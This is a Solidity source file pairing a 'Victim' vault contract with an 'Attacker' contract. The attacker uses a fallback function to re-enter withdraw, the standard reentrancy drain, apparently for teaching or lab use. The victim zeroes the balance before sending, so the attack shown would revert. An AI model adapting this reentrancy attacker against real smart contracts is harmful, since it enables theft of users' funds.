// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Victim {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Failed");

    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attacker {
    Victim public target;

    constructor(address _targetAddress) {
        target = Victim(_targetAddress);
    }

    fallback() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        target.deposit{value: 1 ether}();
        target.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
